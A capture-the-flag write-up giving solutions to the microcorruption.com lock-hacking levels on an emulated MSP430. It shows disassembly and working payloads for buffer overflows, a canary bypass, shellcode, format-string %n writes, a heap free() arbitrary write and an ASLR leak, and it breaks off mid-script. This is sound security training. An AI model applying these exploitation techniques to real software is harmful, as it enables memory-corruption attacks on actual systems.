# `microcorruption.com`

Here, I will provide my solutions to the challenges on
[microcorruption.com].  They may be somewhat terse, but I will try to
make them at least complete.

If you are following along to learn, you should note that specific
values throughout will vary between different users, so the solutions
that work for me will often not work for you verbatim.

## 1. Tutorial

The `check_password` function is relatively straightforward in this 
one:

```
4484 <check_password>
4484:  6e4f           mov.b	@r15, r14
4486:  1f53           inc	r15
4488:  1c53           inc	r12
448a:  0e93           tst	r14
448c:  fb23           jnz	#0x4484 <check_password+0x0>
448e:  3c90 0900      cmp	#0x9, r12
4492:  0224           jeq	#0x4498 <check_password+0x14>
4494:  0f43           clr	r15
4496:  3041           ret
4498:  1f43           mov	#0x1, r15
449a:  3041           ret
```

It simply checks whether the password is 8 characters long.  Thus: 

```password```

will do just fine, for example.

## 2. New Orleans

Looking at the main function, we see it follows a simple flow: Create
the password, whatever that means (at 0x443c), get the inputted
password (0x444a), check the password (0x4450) and either exit
(0x4460) or unlock the door (0x446a) accordingly.

We'll start by seeing what the check_password function does, and
whether we can easily make a password that causes it to affirm that
our password was correct.

We see that it will compare, byte-by-byte, the entered password to the
string stored at 0x2400.  So we break at `check_password` and examine
memory at that location:


```
2400: 2575 2c6a 7138 4900 0000 0000 0000 0000 %u,jq8I.........
```

And behold, the password: `%u,jq8I`.

## 3. Sydney

Once again, the main function has a `check_password` call, so we start
by looking at what `check_password` is doing.  We break at this
function, having entered a password of AAAAAAAA, and observe that it
appears to be comparing our password to something hard-coded into the prorgram:

```
448a:  bf90 7256 0000 cmp	#0x5672, 0x0(r15)
4490:  0d20           jnz	$+0x1c
4492:  bf90 2a49 0200 cmp	#0x492a, 0x2(r15)
4498:  0920           jnz	$+0x14
449a:  bf90 4b3a 0400 cmp	#0x3a4b, 0x4(r15)
44a0:  0520           jne	#0x44ac <check_password+0x22>
44a2:  1e43           mov	#0x1, r14
44a4:  bf90 5b28 0600 cmp	#0x285b, 0x6(r15)
44aa:  0124           jeq	#0x44ae <check_password+0x24>
```

Because of little-endianness, this amonuts to comparing our password to the sequence of bytes:

```
0x72 0x56 0x2a 0x49 0x4b 0x3a 0x5b 0x28
```

Which is:

```
$ echo -e '\x72\x56\x2a\x49\x4b\x3a\x5b\x28'
rV*IK:[(
```

## 4. Hanoi

The input tells us that the password is 8-16 characters, so we start by inputting more, namely (in hex):

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbccddee
```

We break at `0x4540` (after the `getsn` call) and observe that our input has filled RAM with:

```
2400:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa   ................
2410:   bbcc ddee 0000 0000 0000 0000 0000 0000   ................
```

Stepping through the instructions after that, we see the program run through the instruction:

```
455a:  f290 c200 1024 cmp.b	#0xc2, &0x2410
4560:  0720           jne	#0x4570 <login+0x50>
4562:  3f40 f144      mov	#0x44f1 "Access granted.", r15
4566:  b012 de45      call	#0x45de <puts>
456a:  b012 4844      call	#0x4448 <unlock_door>
```

So it will unlock the door if `0x2410` contains the byte value c2.  We
control the value at this address with our input, so we happily
provide a new input:


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaac2
```

Which opens the lock.

## 5. Reykjavik

The main function for this lock is small:

```
4438 <main>
4438:  3e40 2045      mov	#0x4520, r14
443c:  0f4e           mov	r14, r15
443e:  3e40 f800      mov	#0xf8, r14
4442:  3f40 0024      mov	#0x2400, r15
4446:  b012 8644      call	#0x4486 <enc>
444a:  b012 0024      call	#0x2400
444e:  0f43           clr	r15
```

This code appears to encrypt a bunch of stuff in some way, store the
result at `0x2400`, and then (at address `0x444a`) call `0x2400`.

The code stored at `0x2400` looks like:

```
2400:   0b12 0412 0441 2452 3150 e0ff 3b40 2045   .....A$R1P..;@ E
2410:   073c 1b53 8f11 0f12 0312 b012 6424 2152   .<.S........d$!R
2420:   6f4b 4f93 f623 3012 0a00 0312 b012 6424   oKO..#0.......d$
2430:   2152 3012 1f00 3f40 dcff 0f54 0f12 2312   !R0...?@...T..#.
2440:   b012 6424 3150 0600 b490 c4fd dcff 0520   ..d$1P......... 
2450:   3012 7f00 b012 6424 2153 3150 2000 3441   0....d$!S1P .4A
2460:   3b41 3041 1e41 0200 0212 0f4e 8f10 024f   ;A0A.A.....N...O
2470:   32d0 0080 b012 1000 3241 3041 d21a 189a   2.......2A0A....
2480:   22dc 45b9 4279 2d55 858e a4a2 67d7 14ae   ".E.By-U....g...
2490:   a119 76f6 42cb 1c04 0efa a61b 74a7 416b   ..v.B.......t.Ak
24a0:   d237 a253 22e4 66af c1a5 938b 8971 9b88   .7.S".f......q..
24b0:   fa9b 6674 4e21 2a6b b143 9151 3dcc a6f5   ..ftN!*k.C.Q=...
24c0:   daa7 db3f 8d3c 4d18 4736 dfa6 459a 2461   ...?.<M.G6..E.$a
24d0:   921d 3291 14e6 8157 b0fe 2ddd 400b 8688   ..2....W..-.@...
24e0:   6310 3ab3 612b 0bd9 483f 4e04 5870 4c38   c.:.a+..H?N.XpL8
24f0:   c93c ff36 0e01 7f3e fa55 aeef 051c 242c   .<.6..>.U....$,
2500:   3c56 13af e57b 8abf 3040 c537 656e 8278   <V...{..0@.7en.x
2510:   9af9 9d02 be83 b38c e181 3ad8 395a fce3   ..........:.9Z..
2520:   4f03 8ec9 9395 4a15 ce3b fd1e 7779 c9c3   O.....J..;..wy..
2530:   5ff2 3dc7 5953 8826 d0b5 d9f8 639e e970   _.=.YS.&....c..p
2540:   01cd 2119 ca6a d12c 97e2 7538 96c5 8f28   ..!..j.,..u8...(
2550:   d682 1be5 ab20 7389 48aa 1fa3 472f a564   ..... s.H...G/.d
2560:   de2d b710 9081 5205 8d44 cff4 bc2e 577a   .-....R..D....Wz
2570:   d5f4 a851 c243 277d a4ca 1e6b 0000 0000   ...Q.C'}...k....
```

So if we disassemble this (using the provided disassembler), we see
the following (which we have here annotated somewhat):

```
0b12           push	r11
0412           push	r4
0441           mov	sp, r4
2452           add	#0x4, r4
3150 e0ff      add	#0xffe0, sp
3b40 2045      mov	#0x4520, r11
073c           jmp	$+0x10
1b53           inc	r11
8f11           sxt	r15
0f12           push	r15
0312           push	#0x0
b012 6424      call	#0x2464 <func1>
2152           add	#0x4, sp
6f4b           mov.b	@r11, r15
4f93           tst.b	r15
f623           jnz	$-0x12
3012 0a00      push	#0xa
0312           push	#0x0
b012 6424      call	#0x2464
2152           add	#0x4, sp
3012 1f00      push	#0x1f
3f40 dcff      mov	#0xffdc, r15
0f54           add	r4, r15
0f12           push	r15
2312           push	#0x2
b012 6424      call	#0x2464 <func1>
3150 0600      add	#0x6, sp
b490 c4fd dcff cmp	#0xfdc4, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f   
b012 6424      call	#0x2464 <func1>
2153           incd	sp
3150 2000      add	#0x20, sp
3441           pop	r4
3b41           pop	r11
3041           ret
<func1>
1e41 0200      mov	0x2(sp), r14
0212           push	sr
0f4e           mov	r14, r15
8f10           swpb	r15
024f           mov	r15, sr
32d0 0080      bis	#0x8000, sr
b012 1000      call	#0x10
3241           pop	sr
3041           ret
```

In particular, as 0x7f is the interrupt number for unlocking the door,
the bit of code:

```
b490 c4fd dcff cmp	#0xfdc4, -0x24(r4)
0520           jnz	$+0xc
3012 7f00      push	#0x7f   
b012 6424      call	#0x2464 <func1>
```

Seems like the portion responsible for testing the password.

This happens at address `0x2448`.  Thus we will break at this point,
enter the password:

```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

(we would start this with `00` instead of `ff`, but the null byte is
often a terminator for strings, so this seems dangerous) and see if we
control the address it is checking.

First of all, we notice that once our breakpoint at `0x2448` is
reached, the stack looks like:

```
43c0:   0000 0000 0000 0000 0000 0000 0000 7824   ..............x$
43d0:   0100 4424 0200 da43 1f00 ff01 0203 0405   ..D$...C........
43e0:   0607 0809 0a0b 0c0d 0e0f 1011 1213 1415   ................
43f0:   1617 1819 1a1b 1c1d 1e00 0000 0000 4e44   ..............ND
```

So the first 31 of our input values have been used.  Furthermore, the
registers contain the values:

```
pc  2448  sp  43da  sr  0000  cg  0000
r04 43fe  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 4534
r12 00f8  r13 00c4  r14 0002  r15 0200
```

Thus r4-0x24 is 0x43da, which contains the value `0xff 0x01`--the
start of our password.  So perhaps a password of (in hex) simply
`c4fd` (accounting for endianness) will do?

Seems so.

## 6. Cusco

We once again try the same password: 

```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

And behold, it is stored on the stack in full at address `0x43ee`:

```
43d0:   0000 0000 0000 0000 0000 0000 5645 0100   ............VE..
43e0:   5645 0300 ca45 0000 0a00 0000 3a45 ff01   VE...E......:E..
43f0:   0203 0405 0607 0809 0a0b 0c0d 0e0f 1011   ................
4400:   1213 1415 1617 1819 1a1b 1c1d 1e1f 0040   ...............@
```

It does not unlock the door, however we notice that when the login
function is about to return, the registers are:

```
pc  453e  sp  43fe  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 0000  r14 0000  r15 0000
```

In particular, `sp` is an address within our password.  So as entered,
it will return to address 1110.  Thus if we instead input a password
of 16 bytes followed by the address of the `unlock_door` function, we
should get the door open: 

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa4644
```

## 7. Johannesburg

Yet again, we try the password:

```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

In this case, the password is again rejected, but this time, the
program straight-up exits as a result of:

```
4578:  f190 a000 1100 cmp.b	#0xa0, 0x11(sp)
457e:  0624           jeq	#0x458c <login+0x60>
4580:  3f40 ff44      mov	#0x44ff "Invalid Password Length: password too long.", r15
4584:  b012 f845      call	#0x45f8 <puts>
4588:  3040 3c44      br	#0x443c <__stop_progExec__>
```

Apparently, since `sp+0x11` doesn't contain the value `0xa0`, the
password is seen as being too long.  This kind of rudimentary stack
canary is easily defeated, however.  We break at address `0x4578` and
observe that the stack looks like:

```
43e0:   0300 1c46 0000 0a00 0000 7845 ff01 0203   ...F......xE....
43f0:   0405 0607 0809 0a0b 0c0d 0e0f 1011 1213   ................
4400:   1415 1617 1819 1a1b 1c1d 1e1f 005a 3f40   .............Z?@
```

with registers:

```
pc  4578  sp  43ec  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 440c  r14 0000  r15 0000
```

Thus `sp+0x11` is the value `0x11` in our password.  Thus if we enter
17 bytes, followed by `0xa0`, we should bypass this check:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0bbcc
```

And now we notice that the login function continues to the final `ret`
instruction, which will return to address `ccbb` in this case.  If we
make it instead return to the `unlock_door` function at `0x4446`,
we're set:


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa04644
```

## 8. Whitehorse

As usual, starting out with a password of


```
ff0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f
```

We notice for this one that the password is rejected, and that the
`ret` instruction of the `login` function is reached without any
issue.  If we break at this `ret` instruction, we see that the
registers and stack look like:

```
pc  452e  sp  362a  sr  0000  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 0000  r11 0000
r12 0000  r13 0000  r14 0000  r15 0000

3600:   0000 0000 0000 0000 4645 0100 4645 0300   ........FE..FE..
3610:   ba45 0000 0a00 0000 2a45 ff01 0203 0405   .E......*E......
3620:   0607 0809 0a0b 0c0d 0e0f 1011 1213 1415   ................
3630:   1617 1819 1a1b 1c1d 1e1f 0000 0000 0000   ................
```

In particular, bytes 16-17 of the password will be used as the return
address.  But this time, there is no code in the program to unlock the
door that we can just return to.  However, we do have the INT function
at `0x4532`, which expects the interrupt number to be pushed on the
stack.  So if we make the password 16 bytes followed by the address of
the INT function, say:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa3245bbbbcccc
```

then the INT function will expect the `bbbb` to be the return address,
and the `cccc` to be the argument.  We may as well have the program
stop after we open the door as normal, so we make the return address
the address of the "stop the program" code at `0x443c`, and we make
the argument `0x007f`.  Thus our password will be:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa32453c447f00
```

## 9.  Santa Cruz

This is an odd one.  It requires a username and password, both between 8 and 16 bytes.

The method of enforcing this is the following:

After the username and password have been entered, the stack (with
sp=0x43a0) looks like:

```
43a0:   0000 4142 4344 4546 4748 494a 0000 0000   ..ABCDEFGHIJ....
43b0:   0000 0008 1061 6263 6465 6667 6869 6a6b   .....abcdefghijk
43c0:   6c6d 0000 0000 0000 0000 0000 4044 0000   lm..........@D..
```

Notice the 08 and 10 at 43b3.  We note that these are the stated upper
and lower bounds for the lengths of the username and password, and
indeed, if we watch the execution, we see that these are indeed used
for checking lengths.

Since the code that actually reads the username is:

```
4582:  3e40 6300      mov	#0x63, r14
4586:  3f40 0424      mov	#0x2404, r15
458a:  b012 1847      call	#0x4718 <getsn>
```

We actually get 0x63 bytes of username, with which we can clearly
overwrite these values.  Of course, strcpy means we cannot have any
null bytes.  But we can use the username to overwrite these values
with the bytes 01 and 7f--the minimum and maximum positive integers
expressed by a signed byte.

Thus our username will be (in hex):

```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017f```

However, the password must also end in a null byte.  The following
snippet appears at the end of the `login` function:

```
4644:  3f40 3145      mov	#0x4531 "That password is not correct.", r15
4648:  b012 2847      call	#0x4728 <puts>
464c:  c493 faff      tst.b	-0x6(r4)
4650:  0624           jz	#0x465e <login+0x10e>
4652:  1f42 0024      mov	&0x2400, r15
4656:  b012 2847      call	#0x4728 <puts>
465a:  3040 4044      br	#0x4440 <__stop_progExec__>
465e:  3150 2800      add	#0x28, sp
4662:  3441           pop	r4
4664:  3b41           pop	r11
4666:  3041           ret
```

In particular, the instruction at 464c will test for a null byte 18
bytes after the start of the password.  So if we make the password
super long and overflow the return address (which, breaking at the
`ret` instruction, we can discover is at 43cc), this test will
fail and we will exit without returning (on address 465a).

Thus we can do the following trick: We can make the username long
enough to overflow the stack pointer, and we can make the password
exactly 17 bytes, so that a null byte will be written to the 18th byte
after the start of the password.  Of course, we still need byte
offsets 17 and 18 of the username to be 01 and 7f respectively to get
away with this excessive length.

So we try: 

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3b4b5b6b7b8b9b0babbbcbdbebf
cccccccccccccccccccccccccccccccccc
```

And we observe that this reaches the return instruction and b7b6 is
placed into pc.  Therefore we replace this with the address of the
`unlock_door` function: 444a for a final answer of:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa017fa0a1a2a3a4a5a6a7a8a9a0aaabacadaeafb0b1b2b3b4b54a44
cccccccccccccccccccccccccccccccccc
```


## 10.  Addis Ababa

This is the first one with printf--it requests our username/password
combo as one string of the form `username:password` and will printf
this back to us.  This string is not sanitised in any way.

Just before the call to printf, the stack looks like:

```
3ff0:   0024 f43f 0024 0000 fc3f 0000 6161 6161   .$.?.$...?..aaaa
4000:   6161 6161 613a 6262 6262 6262 6200 0000   aaaaa:bbbbbbb...
```

and the stack pointer is at 3ff8.

Thus the first argument to printf--the address of the format string
(3ffc)--is at the stack pointer.  Any further `%x` or similar inputs
are going to pop more data off the stack, then.  The stack looks like:

```
3ffc
0000
[first word of format string]
[second word of format string]
[third word of format string]
```

Therefore, if the format string consists of the following words:

```
[address]
%x
%n
```

Then the following will happen:

* The address will be printed (whatever it is)

* The %x will pop off the 0000 from the stack, leaving `[address]` at
  the top of the stack

* The %n will cause a number to be written to `[address]`.
  Specifically, that number will be the count of characters printed
  thus far.  So it will be some small integer.

So we can get a small integer written to any address we want.  So what
address will we overwrite?  Looking immediately after the printf, we
have the code snippet:

```
447c:  b012 c845      call	#0x45c8 <printf>
4480:  2153           incd	sp
4482:  3f40 0a00      mov	#0xa, r15
4486:  b012 5045      call	#0x4550 <putchar>
448a:  8193 0000      tst	0x0(sp)
448e:  0324           jz	#0x4496 <main+0x5e>
4490:  b012 da44      call	#0x44da <unlock_door>
4494:  053c           jmp	#0x44a0 <main+0x68>
```

We see the test instruction at 448a is the one used to determine
whether to unlock or not.  If we change the offset at 448c, then the
instruction will become, e.g. `tst 0x2(sp)`, which may not be zero.
Indeed, sp will be 3ffa at this point, so sp+(a small integer) will be
within our format string most likely, so nonzero.  

Thus the format string should be:

```
448c
%x
%n
```

The answer, therefore, is just:

```8c442578256e```

## 11. Montevideo

This seems like a straightforward buffer overflow.  The usual
procedure would be:

* Fill the buffer with as many As as possible (0x30 is the limit).

* Break on the ret instruction of the function in which the As were
  placed in memory (address 0x4548).

* See which As are going to be placed into PC (the ones after the
  first 16 As).

* Replace those with the address of the code we'd like to return to.

In this case, there is no `unlock_door` function to return to.
However, there is the call to the `INT` function that we can return
to.  And since we can write to the stack, we can simulate that the
value `7f` was pushed onto the stack just before this call.  Thus we
will go for a buffer of the form:

```{16 bytes of padding}{Address of call INT (e.g. 4460)}{007f}```

Thus:

```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa60447f00```

### Alternative: 

Worth mentioning also is that, if we wanted a shorter input, we could place the assembled code:

```
3012 7f00   push 0x7f
b012 4c45   call INT
```

And then use the address of the start of the input (0x43ee) as the return address:

```{code to unlock door}{padding to length 16}{43ee}```

Or:

```30127f00b0124c45aaaaaaaaaaaaaaaaee43```

The problem is that this assembled code has a null byte, so we need to modify it so that it doesn't.  For example: 

```
mov #0x7f01,r15
dec r15
swpb r15
push r15
call #0x454c
```

```3f40017f1f838f100f12b0124c45```

For a final answer of:

``` 3f40017f1f838f100f12b0124c45aaaaee43 ```


## 12. Jakarta

The username and password are measured and the sum of their lengths
ends up in r15.  Then, the following instruction is used to check that
the total length is at most 32:

``` 4600: 7f90 2100 cmp.b #0x21, r15 ```

In praticular, if the total length is 0x100 = 256, this will compare 0
with 33 and let it past.

At that point, this becomes a normal buffer overflow.  So we put in username:

```{32 bytes of padding}```

(Only 32 bytes since the username gets checked separately to ensure it
isn't too long.)

And the password we put in a 32-byte pattern to determine which bytes
are used for the return address, then then more bytes of padding to
round out the total length to 256:

```{32 byte pattern}{padding to round out total length to 256}```

Thus: 

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
a0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
```

Breaking at the return address, we discover that sp is at the 0xa4
byte.  So we place there the address of the `unlock_door` function:
0x444c:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
a0a1a2a34c44a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
```

## 13. Novosibirsk

This is another format string vulnerability, except now the code we
want to get to execute is not present.  We can again use %n to get a
memory overwrite.  There is the very tantalising snippet in
`conditional_unlock_door`:

```
44c6:  3012 7e00      push	#0x7e
44ca:  b012 3645      call	#0x4536 <INT>
```

If it were pushing `0x7f` instead, we'd be done.  So we want to use %n
in the input to overwrite the word at 0x44c8 with 0x007f.

The problem is that this requires us to output around 0x7f characters.
For this, we'll want to use %s to output a long string in memory.
Scanning through memory, the longest string we can find seems to be at
the end around 0xff80.

First, we have to figure out how many things we need to pop off the
stack, so we use password:

```%x%x```

which outputs:

```78257825```

So in fact, whatever's in the format string will be consumed by the
first %whatever in the format string.

So we try:

```{0xff80}{0x44c8}%s%n```

This will output the four bytes 80, ff, c8, 44, followed by the string
at 0xff80 (however long that is), and then will write the length of
that string (plus 4) to 0x44c8.  Specifically, we try:


```80ffc8442573256e```

We observe that this places the value 0x0082 into address 0x44c8.  We
need it to be 0x7f, so we add three to the offset of the string we're
using:

```83ffc8442573256e```

## 14. Algiers

This is a malloc implementation. Here is the heap under normal
circumstances after two mallocs of 16-byte blocks (starting at 240e
and 2424 with 6-byte headers at the beginning and end of each block),
all filled with the byte 0xaa repeated:

```
2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
2420:   3424 2100 aaaa aaaa aaaa aaaa aaaa aaaa   4$!.............
2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
```

And after the first free: 

```
2400:   0824 0010 0000 0000 0824 1e24 2100 aaaa   .$.......$.$!...
2410:   aaaa aaaa aaaa aaaa aaaa aaaa aaaa 0824   ...............$
2420:   0824 c21f aaaa aaaa aaaa aaaa aaaa aaaa   .$..............
2430:   aaaa aaaa 1e24 0824 9c1f 0000 0000 0000   .....$.$........
```

So the free function uses the information in the headers to overwrite
values in RAM (supposedly, the contents of other headers).  We control
the headers, so maybe we can use this to get an arbitrary 1-word
write.  

We can overflow the heap with a password of `00` and the username:


```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa22203220
```

We note that this writes the value 0x2022 to the address 0x2032 (and
also writes the value 0xc to the address 0x2026).

On the other hand, the username:



So it appears we can get an arbitrary one-word write with a username
like:

```{16 bytes of padding}{value to write}{address to write}```

and a password of `00`.

Inserting a breakpoint at the `ret` instruction of the `login`
function, we see an `sp` value of 0x439a, so if we overwrite this
address with the address of the `unlock_door` function, i.e. 0x4564,
perhaps we can win.

Thus:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa64459a43
00
```

This works, except we notice that, as observed before, this also
overwrites instructions near to 0x4564--in this case, instructions in
the middle of the `unlock_door` function.

So if we instead write the address of a function that calls the
`unlock_door` function (in particular, one where we will not care
about destroying nearby instructions), there might be success that
way.  One such address is 0x4690.  So:

```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa90469a43
00
```

However, for whatever reason, this (as well as using several other
values for 0x4690) places in the address of the return pointer the
value 0x241e instead of the expected 0x4690.  What made 0x4564 special
such that this didn't happen is unclear, but for example, it seems to
happen for any value other than those 0x455e to 0x4588.  This is
likely a result of the details of the malloc implementation that we
are trying still to treat as a black box.

Since it is the free function that we are interested in, let us look
into its behaviour a little.  It is somewhat short, so this won't be
too painful:

```
4508:  0b12           push	r11
450a:  3f50 faff      add	#0xfffa, r15
450e:  1d4f 0400      mov	0x4(r15), r13
4512:  3df0 feff      and	#0xfffe, r13
4516:  8f4d 0400      mov	r13, 0x4(r15)
451a:  2e4f           mov	@r15, r14
451c:  1c4e 0400      mov	0x4(r14), r12
4520:  1cb3           bit	#0x1, r12
4522:  0d20           jnz	#0x453e <free+0x36>
4524:  3c50 0600      add	#0x6, r12
4528:  0c5d           add	r13, r12
452a:  8e4c 0400      mov	r12, 0x4(r14)
452e:  9e4f 0200 0200 mov	0x2(r15), 0x2(r14)
4534:  1d4f 0200      mov	0x2(r15), r13
4538:  8d4e 0000      mov	r14, 0x0(r13)
453c:  2f4f           mov	@r15, r15
453e:  1e4f 0200      mov	0x2(r15), r14
4542:  1d4e 0400      mov	0x4(r14), r13
4546:  1db3           bit	#0x1, r13
4548:  0b20           jnz	#0x4560 <free+0x58>
454a:  1d5f 0400      add	0x4(r15), r13
454e:  3d50 0600      add	#0x6, r13
4552:  8f4d 0400      mov	r13, 0x4(r15)
4556:  9f4e 0200 0200 mov	0x2(r14), 0x2(r15)
455c:  8e4f 0000      mov	r15, 0x0(r14)
4560:  3b41           pop	r11
4562:  3041           ret
```

Boiling this down, we find that if a heap entry's header consists of
words X, Y, Z in that order for example, as a result of our input
consisting of:

```{16 bytes of padding}{X}{Y}{Z}```

then the result will be (among others) the following writes to RAM:

* Value X to address Y

* Some value to address Y+2

* Some value to address Y+4

But only if the following conditions are met:

* The value X must be even (required at instruction address 0x451c)

* The values at address Y+2 and Y+4 must be even (tested at addresses
  0x4522 and 0x4548).

So we have a few possible targets for overwrite . Among others:

* Overwrite the return address of some function with the address of
  the `unlock_door` function.

* Overwrite some instruction with an instruction that jumps to the
  `unlock_door` function.

* Overwrite some instruction with instructions that will unlock the
  door.

Considering option 2, we note with interest that the `unlock_door`
function starts right after the `free` function, at address 0x4564.
Further, we have a few addresses Y where Y, Y+2, and Y+4 all contain
even values.  For example, 0x4556.  So we might overwrite address
0x4556 with an instruction that jumps 14 bytes ahead: `jmp +0xe`, or,
assembled, `063c`.  Thus we have a username input of: 

```aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa063c5645```

with blank password.

## 15. Vladivostok

This is an ASLR challenge.  A format string vulnerability can be used
to leak an address, based on which we can calculate the offsets we
need for overflow.

We notice that the program code contains the `printf` function, and
that it echoes the username we input, so we try a username of `%x%x`.
Sure enough, this outputs

```00007156```

Between multiple runs, the first word remains 0000, but the second
changes.  Could this be a fixed offset within the randomness that we
can use to beat the ASLR?  

The `main` function is:

```
4438 <main>
4438:  b012 1c4a      call	#0x4a1c <rand>
443c:  0b4f           mov	r15, r11
443e:  3bf0 fe7f      and	#0x7ffe, r11
4442:  3b50 0060      add	#0x6000, r11
4446:  b012 1c4a      call	#0x4a1c <rand>
444a:  0a4f           mov	r15, r10
444c:  3012 0010      push	#0x1000
4450:  3012 0044      push	#0x4400 <__init_stack>
4454:  0b12           push	r11
4456:  b012 e849      call	#0x49e8 <_memcpy>
445a:  3150 0600      add	#0x6, sp
445e:  0f4a           mov	r10, r15
4460:  3ff0 fe0f      and	#0xffe, r15
4464:  0e4b           mov	r11, r14
4466:  0e8f           sub	r15, r14
4468:  3e50 00ff      add	#0xff00, r14
446c:  0d4b           mov	r11, r13
446e:  3d50 5c03      add	#0x35c, r13
4472:  014e           mov	r14, sp
4474:  0f4b           mov	r11, r15
4476:  8d12           call	r13
```

At 0x4456, r11 will contain the address where the code will be moved.
At 0x4472, r14 will contain the new address of the top of the stack.

We will run through the program once, leaking an address using the
username `%x%x`, but breaking at these two addresses we will compare
to see what we are actually getting:

* Run 1:
  * Code address: 0xbe8c
  * Stack address: 0xbac2
  * Leaked address: 0xc1f6
  
* Run 2:
  * Code address: 0x9b98
  * Stack address: 0x99d4
  * Leaked address: 0x9f02

In both cases, the leaked address is 874 after the start of the code
address.  So for our password input we can always compute the code
address.  

Let us start a new run, pick up the randomised addresses, and then
test for overflow:

* Code address: 0x9370
* Stack address: 0x8b60
* Leaked address: 0x96da



Now, we test for buffer overflow in the password with the following
password input:

ABACADAEAFAGAHAIAJAKALAMANAOAPAQARASATAUAV

We step through until the main function returns, and behold that `pc`
gets set to 0x4641, or AF.  Thus we get control of the return address
by inputting a password like:

```{8 byte padding}{return address}```

However, this is one of those example with no `unlock_door` function,
so we cannot simply return to the code that does what we want.  So we
have two choices:

* Look for ROP gadgets to do the job

* Find another way to jump to the stack to run code there.  However,
  at the moment after this return, we have the registers set up thus:

```
pc  4641  sp  8b5e  sr  0004  cg  0000
r04 0000  r05 5a08  r06 0000  r07 0000
r08 0000  r09 0000  r10 4441  r11 4541
r12 0000  r13 000a  r14 8b52  r15 8b52
```

So we notice that in fact r14 is an address on the stack!  So if we
want to get code running on the stack, we can jump back to the `call
r14` instruction in `aslr_main` (which, presumably, we can compute the
address for, since we know the start of the copied code).  This will
jump us back to just before our password, which currently looks like:

```
8b50:   0000 da96 4142 4143 4144 4145 4146 4147   ....ABACADAEAFAG
8b60:   4148 4149 414a 414b 0000 0000 0000 0000   AHAIAJAK........
```

So we can put code as the first 8 bytes of the password.  For example: 

```
mov #0x7f,r15
jmp [address of INT code]
```

i.e.:

```3f407f003040[address of INT]```

For a final username/password combo of:

```
%x%x
3f407f003040[address of INT][address of call r14]
```

Now, we can compute: the address of `call r14` within the unrandomised code is:

```
4762:  8e12           call	r14
```

That is, at an offset 0x362 from the start of the code.

And the interrupt-making code we want to run is: 

```
4912:  8f10           swpb	r15
4914:  024f           mov	r15, sr
4916:  32d0 0080      bis	#0x8000, sr
491a:  b012 1000      call	#0x10
```

That is, an offset 0x512 from the start of the code.  

Then, since the leaked address is always an offset of 874=0x36a from
the start of the code, we will do:

```30127f00b012{leaked - 0x36a + 0x362}{leaked - 0x36a + 0x512}```

This we can get by:

```
import sys
leaked = int(sys.argv[1],16)
